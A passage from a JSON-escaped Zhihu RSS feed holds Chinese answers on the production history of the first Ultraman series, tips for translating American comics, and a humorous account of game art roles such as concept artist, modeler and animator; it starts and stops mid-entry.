</p>\n<p>但是这个想法被中野稔，也就是光学摄像给否了，他觉得这样和科特队的成员的射线就没区别了，必须是更石破天惊的那种光线，这个想法也得到了饭岛敏宏的认可，于是高野就说从整个手掌发出光线试试看，这个想法得到了大家的认可。 </p>\n<p>中野又表示发射的时候手掌不要动，否则会影响光学合成的效果和质量，于是在这两点要求的前提下，通过不断让古谷敏摆姿势最终确定了这个十字形的手势。 </p>\n<h3>特摄之三：关于“动作戏”</h3>\n<p>先讲一个事情：初代曼整部作品，是没有杀阵这个职位的，也就是说，没有专业的武术指导来指导皮套演员打架。</p>\n<p>那有的人可能就有疑问了，没有武术指导，那打得能好看吗？</p>\n<p>答案是：没人在乎打得好不好看。 我们把时间往回拨，拨到1954年，担任哥斯拉皮套演员的中岛春雄就这个问题问过円谷英二，英二的回答是：你想做什么动作就做什么动作。</p>\n<p>因为拍的是特摄电影，所以动作元素并不重要。但是放在奥特曼里，这个就有点行不通了，因为毕竟有个巨大人型生物在这边晃来晃去的，你让他完全不考虑格斗元素也不现实。</p>\n<p>但是问题在于，担任奥特曼的皮套演员的古谷敏，他不是动作戏出身的。这个时候，我们的高野桑就又站了出来：实在不行我来吧。</p>\n<p>于是，除了特技监督，特技摄影之外，我们的高野桑又开始兼任杀阵，指导古谷敏和其他的皮套演员的打架的场面。 </p>\n<p>但是，我们一定要知道的是，高野桑的本职工作，是特技监督，他设计动作的一个非常核心的要点就是：动作要能为体现特殊技术做辅助。也就是说，动作只是为了让特摄场面更有观赏性的辅助元素。</p>\n<p>所以呢，可以说在奥系列里，不能体现特摄技巧的格斗场面，其本身的价值是非常有限的，所以现在部分人动辄“打戏分析”，动辄“打戏好”，倒也不是说不行，但总归有点舍本逐末了。 </p>\n<h2>来了，我们的奥特曼</h2>\n<p> 1966年4月1日，是奥特曼第一次出现在大众媒体的日子，可是这天的情况却并不顺利。穿上皮套，戴上面具的古谷敏根本什么都看不见，只能被人牵着走来走去，饭岛，高野这些负责第一块的工作人员都面面相觑，心想这还怎么得了，还是的场彻见过世面，急中生智在面具上开了两个窥孔，这才让古谷摆脱了零视野的状态。 </p>\n<p>就在这种混乱的时刻，円谷英二来了，他抬头看着古谷敏（因为古谷敏太高了），一边拍了拍他的肩膀，一边问：奥特曼，怎么样？痛不痛苦，能看见吗？能听得见吗？ 老爷子还说了点别的东西，只是因为太热了，皮套又有隔音效果，导致古谷敏没听清他说了什么，多年以后才知道老爹说的是“梦想啊，要给小孩子梦想”。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-653434a222bb71d07a5656e472569a09_720w.jpg?rss\" data-rawwidth=\"674\" data-rawheight=\"1008\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-653434a222bb71d07a5656e472569a09\" data-watermark-src=\"v2-fb391b6388ca806e7ff86bd23fa7d6f5\" data-private-watermark-src=\"v2-7d2ac8df2bf41192615455e946e38c74\"></p>\n<p>正是建立在这样的信念上，那个红银相见的巨人出现在了荧幕上，并成为了一代又一代孩子的童年记忆。我们的奥特曼，来了！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/kazamori-masaki?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">风森正辉</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/265413321/answer/1996395962?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">38 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/335062212?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">除了初代以外的哪个奥特曼更能代表奥特曼系列？</a><br><a href=\"http://www.zhihu.com/question/29112455?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何单凭脸部来分辨初代、杰克和佐菲三个奥特曼？</a><br>\n","link":"http://www.zhihu.com/question/265413321/answer/1996395962?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"翻译漫画有哪些需要知道的要点或技巧？","date":"2021-07-18 04:00:09","description":"\n<p>看了大部分回答都是讲日本漫画的，我从美漫汉化的角度讲一些经验吧：</p>\n<hr>\n<p><b>1. 注意语句通顺</b></p>\n<p>很多想加入汉化组当翻译的小伙伴第一句问的就是“需要六级几分？”实际上从我个人的经验来看，相比英文水平，更重要的是中文水平。英语看不懂，借助查字典甚至机器翻译，大部分的意思都能搞懂。但是，把它变成一句读起来通顺流畅的中文，并没有想象中的那么容易。</p>\n<p>有一次我做校对，那个译文我真的是一个字都没看懂，仿佛古神的低语……汉化组嘛，大家都是用爱发电，也不好意思说什么，最后我受不了了，直接从头到尾重新翻译了一遍。所以，翻译出来之后自己先把译文读一遍，先确保读者能看懂，再说其他的。</p>\n<p>在这里我给大家提供两个英文翻译成中文的小窍门：第一是把复杂句的从句拆出来变成简单句，第二是把被动句改为主动句并且补上主语。这两个小窍门可以在很多情况是解决“把英文表达方式转换为中文常见的表达方式”的捷径。当然了，这两个小窍门也不是时时都能用，因为在不同的场景和语气下，台词所需要强调的内容可能跟这些语法有关系，这个就要具体情况具体理解了。</p>\n<hr>\n<p><b>2. 注意用语场景</b></p>\n<p>说到这里也想吐槽一下好多人的一提到翻译脑子里就冒出“信达雅”，一堆大白话被翻译成自以为高雅的文白夹杂的“古风”还被盲目追捧，我看起来实在浑身尴尬。漫画里很多表达就是口语，翻译成大白话，简单直接就行了。</p>\n<p>当然，这就涉及到人物语气的问题，也有一些小窍门跟大家分享：如何让译文看起来更像口语？从自己生活日常的语言来取材！例如，把“我们”换成“咱们”，把“什么”换成“啥”，把“小时”换成“钟头”等等。不过，这就引出了另一个问题：中文里很多口语化的表达其实是带有地方性或者说方言色彩的，比如儿化音，“外婆”和“姥姥”之间的区别等等。这时候就出现了一条很微妙的线：“接近中文口语化”和“听起来像四川/东北/天津/xx人”之间的区别到底在哪？读者体验又会是什么样？</p>\n<p>我个人的追求还是更接近“异化”，让读者体验到原文的语境，所以我的习惯是尽量少用成语，少用方言，少用带中文典故的词，少用中文网络流行语。当然了，这个就是翻译理念的区别了，也有喜欢追求“归化”的译法，这就见仁见智了。翻译是一种再创造，很多情况下需要译者自己把握这条界限，也需要多听取读者的反馈，不断调整自己的做法，这个说起来话题就大了，需要大家自己多学习，多训练，形成自己的风格。</p>\n<hr>\n<p><b>3. 注意语言的韵律感和节奏感</b></p>\n<p>这一点其实是难度颇大的，主要是因为在英文中，很多词在口语和书面语中是通用的；或者换个方式说，英文的口语词并不一定就会显得“俚俗”。而同样意思的中文词，却又往往口语词只在口语中用，而书面语完全是另一个词，这时候再试图追求原文的韵律或者节奏，要么像打油诗或者rap，要么就掉进前文说的“古风”陷阱。这一点其实我个人也没有什么完全的解决办法，只能建议大家根据具体情况具体分析，同时要去熟悉一些英文文学中比较特有的行文方式：例如押头韵、不同抑扬格的格式等等。首先别把这些东西漏了，之后就看译者的功力了。当然假如实在翻译不出原文的韵律，也不必灰心，这本身就是很难的事。把意思翻译出来，加个注释把原文的特殊格式解释给读者也不失为一个选择。</p>\n<hr>\n<p><b>4. 漫画语言的特点</b></p>\n<p>上面三点其实对于很多通俗作品都适用，同时，漫画这个媒介本身有自己的特点。比如：</p>\n<p>a. 对话框的大小已经被原文固定了，所以，翻译出来的中文内容，最好能根据需要调整长度，达到占用的空间能和英文内容差不多，这样子填字后看起来更加美观。</p>\n<p>b. 注意翻页的悬念：漫画里最常见的一种创作手法是，把一句完整的话分成两部分，前一半在翻页之前的最后一个旁白框/对话框，后一半在翻页之后的第一个旁白框/对话框；或者说“翻页前提出问题，翻页后给出答案”这样制造悬念，吸引读者翻页的做法。这时候要特别注意，因为许多英文句子很可能是要调换个顺序，中文才更通顺，这时候或许就跟要制造的悬念冲突了。这也就是我上文提到的复杂句改简单句/被动句改主动句的时候往往不适用的地方。这时候怎么翻译，就看出译者的功夫来了，很多情况没有一个通用原则，需要大家自己多尝试，提高自己的水平。</p>\n<p>c. 填字时候的要点：其实各个汉化组自己都有一些相应的填字规则，我大概说一下自己喜欢的用法吧。</p>\n<p>首先，尽量用半角标点符号，因为全角符号会导致空出半个格子，在对话框里很扎眼；</p>\n<p>其次，填出来的段落形状尽量符合对话框的形状，例如椭圆形对话框，就把段落填成中间一行最长，往上往下每行都逐步缩短，这样把段落形成一个椭圆形，读起来观感佳；</p>\n<p>第三，一个词中间尽量不断行，读者阅读更舒适；</p>\n<p>第四，中文没有原生的斜体，所以原文的如果有斜体，到了中文最好换一种强调方式，因为中文的斜体实在是太难看了；</p>\n<p>第五，我个人比较喜欢在普通对话框里使用无衬线字体，比如微软雅黑、黑体等等。在我看来，这种用法比较接近美漫中绝大多数对话框采用大写字母的意图：在小空间内使用尽量简洁整齐的填字方式，更易读。</p>\n<hr>\n<p>另外，我看到其他许多回答说的“要注意俚语、术语和特殊表达方式”等等，其实我觉得这个是翻译的基础要求，就是“弄懂原文”，这个都没做到的话，其他一切都无从谈起。所以我并不特别强调这个，因为我觉得只要是认真的译者，都会把可能出现的、自己不明白的表达方式都给查清楚了，再开始翻译。看不懂别硬翻，多查多问。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xiao-yao-81-38?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">肖尧</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/351873262/answer/2003865793?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">5 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/312024044?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">日文原版漫画到哪里去买？</a><br><a href=\"http://www.zhihu.com/question/368229455?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有哪些好的漫画适宜睡前阅读？</a><br>\n","link":"http://www.zhihu.com/question/351873262/answer/2003865793?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"游戏美术岗位，哪个最苦逼？","date":"2021-07-18 03:00:08","description":"\n<p>一入画圈深似海，从此头发是路人。</p>\n<p><b>游戏美术的养成需要经过多年苦练，</b></p>\n<p><b>根据分工不同又都各有难点。</b></p>\n<p>我们探访了部分美术同学，</p>\n<p>听听他们是如何“吐槽”自己岗位的。</p>\n<hr>\n<h2>日常卡稿的角色原画师：</h2>\n<p>对原画师来说，</p>\n<p><b>郁闷的一点是经常被弄混。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-6f47d802dab1b296ea87b126c14691e7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"198\" data-rawheight=\"171\" data-watermark=\"original\" data-original-src=\"v2-6f47d802dab1b296ea87b126c14691e7\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>很多人可能以为原画是这样的：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-423eff733ae0a9d730da2ac1b1fc4c16_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"882\" data-watermark=\"original\" data-original-src=\"v2-423eff733ae0a9d730da2ac1b1fc4c16\" data-watermark-src=\"v2-31173dd299ffa14a5cb724a5ebb39078\" data-private-watermark-src=\"v2-8f2a5b334e899fb8b0483c375d34d7e5\"></p>\n<p>但其实这是美宣图。</p>\n<p><b>真实的原画是类似这样的：</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-330330edcb013ba10b9d50c404f54e0f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1127\" data-rawheight=\"556\" data-watermark=\"original\" data-original-src=\"v2-330330edcb013ba10b9d50c404f54e0f\" data-watermark-src=\"v2-db4adb4044c2c1639890cbcc74b1fbd3\" data-private-watermark-src=\"v2-d43b9252c96f041c44355cc64c480bbc\"></p>\n<p>这样的：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-52d7c374482e78bb09536ef7bd953396_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1013\" data-rawheight=\"432\" data-watermark=\"original\" data-original-src=\"v2-52d7c374482e78bb09536ef7bd953396\" data-watermark-src=\"v2-0ed719e051b8b0efeb5ba332b1de101b\" data-private-watermark-src=\"v2-5f5d0d99669cfa812604b309b743cfe7\"></p>\n<p><b>美宣顾名思义，</b></p>\n<p><b>一般是用于市场宣传，展现吸引力的精美海报，</b></p>\n<p><b>因此情景完整，神态丰富，重在“画工”</b></p>\n<p><br></p>\n<p><b>原画则往往是美术研发的第一步，</b></p>\n<p><b>更像一张施工图或设计稿，</b></p>\n<p><b>重在发挥想象力和创意的“设计”</b></p>\n<p><br></p>\n<p>为了便于后续3D建模、动画、特效等环节的参考，</p>\n<p>原画的人物姿势不必复杂，</p>\n<p><b>而是以正、侧、背面的三视图为主，</b></p>\n<p><b>将武器、服装、配饰、材质等设定交代分明，</b></p>\n<p>跟美宣的对外功能是十分不同的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-0ae26e8e9312a9e9ab48b27130267376_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1506\" data-rawheight=\"307\" data-watermark=\"original\" data-original-src=\"v2-0ae26e8e9312a9e9ab48b27130267376\" data-watermark-src=\"v2-c0021471880e2713e5371a99ebbbb96d\" data-private-watermark-src=\"v2-e9e9b731cbc38f4d0cf10cda0f93d974\"></p>\n<p><b>虽说是创意设计，</b></p>\n<p><b>但原画师并不能随心所欲,</b></p>\n<p><b>完全按自身风格和审美去发挥，</b></p>\n<p><b>而是要适应一套严谨的设计流程。</b></p>\n<p><br></p>\n<p>研发一款皮肤前，</p>\n<p>策划、美术、运营、音频等成员会先展开几轮脑暴会，</p>\n<p>提出潜在的主题提案，</p>\n<p>讨论（chǎo jià）出是否有足够的创意空间和独特亮点。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1121ec988485ac9f04b92db569d4608c_720w.gif?rss\" data-caption=\"其实没那么夸张，还是比较和谐的，同秃与共\" data-size=\"normal\" data-rawwidth=\"719\" data-rawheight=\"385\" data-watermark=\"original\" data-original-src=\"v2-1121ec988485ac9f04b92db569d4608c\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>如果提案得到一致通过，</p>\n<p>世界观架构师就会输出一版文案，</p>\n<p>定下皮肤主题、人设、故事与台词，</p>\n<p>而原画师围绕这些文字展开想象，</p>\n<p>构思如何用视觉语言呈现出来。</p>\n<p><br></p>\n<p><b>但在面对不熟悉的主题或风格时，</b></p>\n<p><b>原画师有时也会感到无从下手，</b></p>\n<p><b>甚至陷入卡壳的状态</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-628964dbe8259ac396ff8df4b695fe21_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"198\" data-rawheight=\"112\" data-watermark=\"original\" data-original-src=\"v2-628964dbe8259ac396ff8df4b695fe21\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>为了寻找灵感，</p>\n<p>原画师会解构主题，</p>\n<p>拆解出关键词，</p>\n<p>并尽可能查阅资料，</p>\n<p>比如看书、看视频、浏览艺术网站，</p>\n<p>变身列文虎克，</p>\n<p>罗列出可融入的视觉元素。</p>\n<p><b>风险是随时可能被当成在上班摸鱼。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-71b803825be93400ff9e403cc6b2a8f3_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"733\" data-rawheight=\"390\" data-watermark=\"original\" data-original-src=\"v2-71b803825be93400ff9e403cc6b2a8f3\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>当然，</b></p>\n<p><b>有时信息太多和信息太少都是同等灾难。</b></p>\n<p>原画师可能被淹没各种元素中，</p>\n<p>或陷入左右互搏的思绪里，</p>\n<p>时间却在飞速流逝，DDL迫近。</p>\n<p><br></p>\n<p><b>这时要赶紧对元素进行提炼，</b></p>\n<p><b>避免停留在完美主义发作的构思阶段。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-54f85904bf5face6bcc995d0b4e18ef9_720w.jpg?rss\" data-caption=\"再次卡稿的原画师\" data-size=\"normal\" data-rawwidth=\"537\" data-rawheight=\"332\" data-watermark=\"original\" data-original-src=\"v2-54f85904bf5face6bcc995d0b4e18ef9\" data-watermark-src=\"v2-37ee9c0de7153ab9703427cb8524344e\" data-private-watermark-src=\"v2-c93dbc9f998ba6dddf1e3bcdc793cdba\"></p>\n<p>经过一番提炼取舍，</p>\n<p>原画师开始动手绘制，</p>\n<p><b>结合对角色气质、体型、玩法、游戏内效果等考虑，</b></p>\n<p><b>将视觉元素融入到皮肤设计中，</b></p>\n<p><b>并推出几版配色方案，</b></p>\n<p><b>及时与团队交流并推进。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-6258288db5e6d8d90efb0b0bf29d11b8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1817\" data-rawheight=\"739\" data-watermark=\"original\" data-original-src=\"v2-6258288db5e6d8d90efb0b0bf29d11b8\" data-watermark-src=\"v2-799f8ce0f157f7a80a87baf65d6495fd\" data-private-watermark-src=\"v2-5e27fbefc0120fd93444fc0a5c9c039f\"></p>\n<p><b>对于一些内行的命题，</b></p>\n<p><b>仅凭原画师自己难以保证效果，</b></p>\n<p><b>也会寻求专业支持。</b></p>\n<p><br></p>\n<p>比如<a href=\"https://www.zhihu.com/question/350341955/answer/940622972\" class=\"internal\">“上官婉儿·梁祝”皮肤的设计</a>，</p>\n<p>就与浙江小百花越剧团深度合作；</p>\n<p>而在<a href=\"https://www.zhihu.com/question/35424434/answer/1266262943\" class=\"internal\">“杨玉环·遇见飞天”的皮肤设计</a>中，</p>\n<p>团队飞往敦煌实地考察，</p>\n<p>得到了敦煌研究院的专家指导。</p>\n<p>在一版版推倒重来的打磨后，</p>\n<p>才得到“有神了”的认可。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8456ff561d9f9cbba7e456996b644ba3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1507\" data-rawheight=\"415\" data-watermark=\"original\" data-original-src=\"v2-8456ff561d9f9cbba7e456996b644ba3\" data-watermark-src=\"v2-9066c7daa137d033824f849228ce9567\" data-private-watermark-src=\"v2-249438707953f78bd00c79b9869d8b83\"></p>\n<p><b>有时原画看似不如美宣华丽，</b></p>\n<p><b>但背后也是一场漫长的心智马拉松。</b></p>\n<p><br></p>\n<p>所以如果看到身边的原画师两眼无神，</p>\n<p>发际线日益稀疏，</p>\n<p>那一定是正在绞尽脑汁，</p>\n<p>努力摆脱日常卡稿的状态。</p>\n<p>请大家一定珍爱身边的原画师，</p>\n<p>比如从请TA喝奶茶做起。</p>\n<p><br></p>\n<p><b>至于“原画师和建模师会不会打架？”的历史难题，</b></p>\n<p><b>还是请建模师回答吧！</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-3c12ff02d187ac388544df05e23197bd_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"172\" data-rawheight=\"202\" data-watermark=\"original\" data-original-src=\"v2-3c12ff02d187ac388544df05e23197bd\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<hr>\n<h2><b>日常背锅的建模师：</b></h2>\n<p><br></p>\n<p><b>有人会吐槽说建模和原画，</b></p>\n<p><b>就是买家秀和卖家秀的区别，</b></p>\n<p><b>也是导致原画和建模打架的根源。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-59c46bf7141ceca60dba0e831c0a527e_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"220\" data-rawheight=\"220\" data-watermark=\"original\" data-original-src=\"v2-59c46bf7141ceca60dba0e831c0a527e\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>真相真不是那么简单！</b></p>\n<p><b>请听听我的狡辩。</b></p>\n<p><br></p>\n<p><b>职能上简单来说，</b></p>\n<p><b>建模师负责根据原画师的2D设计图，</b></p>\n<p><b>精准制作成3D模型，</b></p>\n<p><b>并放在游戏引擎里完成效果调试。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-65285c10dfc408ec007ae1e32f394817_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"805\" data-rawheight=\"409\" data-watermark=\"original\" data-original-src=\"v2-65285c10dfc408ec007ae1e32f394817\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>大家可以想象一下捏黏土，</p>\n<p>没有足够经验的人，</p>\n<p>即使用灵活的双手和工具，</p>\n<p>对着实物参照，</p>\n<p>也很容易把泥塑捏得画风崩坏。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4284c59f59165fdfa5353485b31b4d01_720w.jpg?rss\" data-caption=\"比如有名的“邪神手办”\" data-size=\"normal\" data-rawwidth=\"662\" data-rawheight=\"487\" data-watermark=\"original\" data-original-src=\"v2-4284c59f59165fdfa5353485b31b4d01\" data-watermark-src=\"v2-893daa03596ca823074c4d783ec34990\" data-private-watermark-src=\"v2-85c6d751b65e06f26f04bfbd59512a36\"></p>\n<p>而3D建模大多是在复杂的专业软件上操作</p>\n<p>参照2D平面原画去进行3D立体还原。</p>\n<p><b>由于平面存在角度遮挡和部分视野盲区，</b></p>\n<p><b>也更考验建模师运用自己的空间想象力，</b></p>\n<p><b>或专业的人体和服饰结构知识来补齐</b>。</p>\n<p><br></p>\n<p><b>所以简单来说，建模真的很不简单！！！</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-42aceacdf465bc1bf1f1dd3711ab5aac_720w.jpg?rss\" data-caption=\"\" data-size=\"small\" data-rawwidth=\"690\" data-rawheight=\"670\" data-watermark=\"original\" data-original-src=\"v2-42aceacdf465bc1bf1f1dd3711ab5aac\" data-watermark-src=\"v2-a4f72bcb03405dd39807dc809794c323\" data-private-watermark-src=\"v2-97760711a7e3b35d1098c6850a0e9859\"></p>\n<p><b>首先是局外模型的搭建。</b></p>\n<p><b>局外建模是一个由简到繁，又由繁到简的过程。</b></p>\n<p>建模师会先研究原画设计中的身型和结构，</p>\n<p>捏出一个大致轮廓，也称粗模。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5c19445ea03ac64bbce9ecbae356ee01_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1515\" data-rawheight=\"772\" data-watermark=\"original\" data-original-src=\"v2-5c19445ea03ac64bbce9ecbae356ee01\" data-watermark-src=\"v2-529ab8d4f47e37846e094150f35ded55\" data-private-watermark-src=\"v2-44a8cb55e6664a217816529f059aabff\"></p>\n<p>在粗模的基础上，</p>\n<p>建模师继续使用ZBrush等专业工具，</p>\n<p>对粗模精雕细琢，</p>\n<p>打造出一个高面数的模型，</p>\n<p>也即由简到繁。</p>\n<p><br></p>\n<p><b>面数指的是构成模型的面的数量，</b></p>\n<p><b>面数越高，面越小，模型表面就越是光滑细腻。</b></p>\n<p><b>一个高精度模型的面数就可能超过一千万，</b></p>\n<p><b>这会给设备的处理性能带去极大负担。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c2bef30b87bbe19088814e32b10cc8a1_720w.gif?rss\" data-caption=\"高精度模型放大后的面数细节\" data-size=\"normal\" data-rawwidth=\"802\" data-rawheight=\"422\" data-watermark=\"original\" data-original-src=\"v2-c2bef30b87bbe19088814e32b10cc8a1\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>因此，在将模型放入游戏内之前，</p>\n<p><b>建模师要对高精度模型进行一个由繁到简的处理。</b></p>\n<p><b>这一工序也就是烘焙。</b></p>\n<p><br></p>\n<p><b>烘焙时，建模师会调出一个低面数的模型，</b></p>\n<p><b>用于包裹原先的高面数模型，</b></p>\n<p><b>通过软件计算和映射，</b></p>\n<p><b>较低面数的模型也能模拟出高面数的效果，</b></p>\n<p><b>从而减轻手机的性能负担，让画面更加流畅。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-700e68eccd049f9c97bba2d5e9bff14a_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"802\" data-rawheight=\"422\" data-watermark=\"original\" data-original-src=\"v2-700e68eccd049f9c97bba2d5e9bff14a\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>可能部分玩家会认为游戏内建模不够精细，</p>\n<p><b>但在适配手机性能的前提下，</b></p>\n<p><b>烘焙和降低面数其实是必不可少的处理！</b></p>\n<p><br></p>\n<p><b>在对烘焙后的模型进行精修后，</b></p>\n<p><b>建模师会转战专门的贴图软件，</b></p>\n<p>给模型上色，并添加相应的材质效果，</p>\n<p>让模型显得更加完整逼真。</p>\n<p><br></p>\n<p><b>最后是渲染环节。</b></p>\n<p><b>简单来说，</b></p>\n<p><b>渲染就是通过控制模型和场景的灯光氛围，</b></p>\n<p><b>对材质效果进行品质上的进一步提升，</b></p>\n<p>再配合上动画、特效等元素，</p>\n<p>就有了栩栩如生的3D动态角色。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-bd1a90e7488c0f19fb206ab4e936fc4f_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"802\" data-rawheight=\"422\" data-watermark=\"original\" data-original-src=\"v2-bd1a90e7488c0f19fb206ab4e936fc4f\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>一般而言，在完整的研发流程中，</b></p>\n<p><b>3D建模花费的时间总是最长的，</b></p>\n<p>再加上打磨细节和加入动态物理PRB材质等优化工序，</p>\n<p>往往需要十几天，</p>\n<p>可见整个流程的漫长繁琐。</p>\n<p><br></p>\n<p><b>因为建模是直接应用在游戏内的物体，</b></p>\n<p><b>还需要搭配动画、特效、程序技术等复杂的开发过程，</b></p>\n<p><b>也就是说，建模除了尽可能还原原画设计，</b></p>\n<p><b>更要考虑实际的应用层面，</b></p>\n<p><b>尤其是在手机上的运行表现，</b></p>\n<p><b>因此不可避免地要做出一些取舍。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-3b035a1d9e99336a3721fd71a64b3919_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"591\" data-rawheight=\"284\" data-watermark=\"original\" data-original-src=\"v2-3b035a1d9e99336a3721fd71a64b3919\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>所以，对于“原画师和建模师会不会打架”的难题。</p>\n<p>答案其实是“不会”。</p>\n<p><b>虽然有时原画和建模会为了细节的取舍而激烈讨论，</b></p>\n<p><b>但都是希望能做出更好的呈现效果，</b></p>\n<p><b>正面讨论也有利于解决问题和优化方案。</b></p>\n<p><br></p>\n<p>随着未来研发技术的不断发展，</p>\n<p>比如更好的渲染引擎、更精致的贴图、更真实的光照技术</p>\n<p>原画和建模总会更容易达成共识的吧。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1370bc70cbb9f36a8548f0ea4a1e9c88_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"360\" data-rawheight=\"360\" data-watermark=\"original\" data-original-src=\"v2-1370bc70cbb9f36a8548f0ea4a1e9c88\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<hr>\n<h2><b>日常“变形”的动画师：</b></h2>\n<p><br></p>\n<p><b>亲爱的朋友们，</b></p>\n<p><b>不知你们看过“学了三年动画”系列吗？</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-417db7861370cae51675057deb79f4fa_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"213\" data-rawheight=\"178\" data-watermark=\"original\" data-original-src=\"v2-417db7861370cae51675057deb79f4fa\" data-watermark-src=\"v2-23fa536af29ce8a752be62d86249b771\" data-private-watermark-src=\"v2-2f0630f59e54f5a182e0eefa1ebf80a0\"></p>\n<p><b>写到这里，我的privilege已经尽数体现了。</b></p>\n<p><b>没错，最苦的人是我。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-ef9d98020c5808e1add650766889e9d9_720w.gif?rss\" data-caption=\"“学了三年动画”系列，虽然部分是为了搞笑效果，但一定程度上体现了3D动画的不容易  图源：B站MAX-小仙女\" data-size=\"normal\" data-rawwidth=\"784\" data-rawheight=\"378\" data-watermark=\"original\" data-original-src=\"v2-ef9d98020c5808e1add650766889e9d9\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>从职能上来说，</b></p>\n<p><b>角色动画师的职责是“赋予角色灵魂”，</b></p>\n<p><b>也就是根据设定</b></p>\n<p><b>设计角色在游戏中的行为动作与表情表演，</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-2fb1ed3156aa53375210f3b70aeb7481_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"719\" data-rawheight=\"417\" data-watermark=\"original\" data-original-src=\"v2-2fb1ed3156aa53375210f3b70aeb7481\" data-watermark-src=\"\" 